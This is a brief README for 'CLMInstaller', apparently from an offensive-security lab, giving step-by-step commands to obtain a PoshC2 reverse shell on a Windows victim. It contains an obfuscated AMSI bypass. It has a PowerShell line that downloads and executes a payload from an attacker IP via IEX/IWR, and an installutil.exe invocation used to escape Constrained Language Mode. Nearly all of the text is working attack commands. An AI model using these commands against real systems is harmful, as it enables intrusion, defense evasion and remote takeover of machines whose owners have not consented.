# CLMInstaller

Example for a Posh-Reverse-Shell
```
# On Victim
echo "192_168_45_209_80_finance" > C:\Windows\Tasks\finances.txt
```
Create a file `finance` that will be being hosted on your webserver.
```
ip="192.168.45.172"; 
filename="payday.txt";

# Create payday.txt
cat /var/poshc2/rastalabs/payloads/Launcher.hta | grep -oP "(?<=hidden -e ).*(?=',)" | base64 -d | iconv -t utf-8 -f utf-16le > ./$filename

# Create finance 
echo -ne '$t = [Runtime.InteropServices.Marshal];$a = [Ref].Assembly.GetType("Sy" + "st" + "em.M" + "ana" + "gemen" + "t.Au" + "tom" + "ati" + "on." + "Am" + "si" + "Ut" + "ils"); $t::WriteInt32($a.GetField("am" + "si" + "Con" + "text",[Reflection.BindingFlags]"NonPublic,Static").GetValue($null),0x41414141);IEX(IWR -UseBasicParsing http://'$ip':8080/'$filename')' > finance
```

And then run the following command on the Victim:
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\CLMInstaller.exe
```
